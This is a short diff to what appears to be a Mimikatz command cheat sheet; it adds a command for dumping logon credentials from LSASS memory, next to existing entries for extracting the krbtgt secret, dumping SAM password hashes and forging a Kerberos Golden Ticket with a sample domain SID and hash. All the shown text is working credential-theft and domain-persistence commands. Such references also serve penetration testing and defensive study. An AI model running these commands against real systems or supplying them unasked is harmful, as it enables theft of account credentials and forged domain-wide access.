@@ -26,6 +26,9 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 # Dump all SAM local password hashes
 mimikatz # lsadump::sam
 
+# Dump credentials from the LSASS memory
+mimikatz # sekurlsa::logonpasswords
+
 # Create a Kerberos Golden Ticket
 mimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid
 :S-1-5-21-849420856-2351964222-986696166 /krbtgt:7808900312cc005cf7082a9a89eb
